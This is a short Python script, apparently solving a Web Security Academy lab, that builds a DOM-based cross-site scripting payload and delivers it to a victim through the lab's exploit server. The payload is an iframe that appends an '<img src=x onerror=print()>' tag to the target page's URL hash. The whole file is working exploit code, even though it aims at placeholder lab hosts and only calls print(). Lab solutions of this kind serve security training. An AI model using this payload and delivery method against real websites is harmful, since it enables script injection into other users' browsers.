import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
exploit_server = 'https://exploit-server-ID.exploit-server.net/' # Replace with your actual Exploit server ID
payload = f"<iframe src=\"{base_url}#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>"

data = {
    "urlIsHttps":"on",
    "responseFile":"/exploit",
    "responseHead":"HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody":payload,
    "formAction":"DELIVER_TO_VICTIM"
}

response = requests.post(exploit_server, data=data)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(exploit_server)
    webbrowser.open(exploit_server)
else:
    print("Something went wrong.")
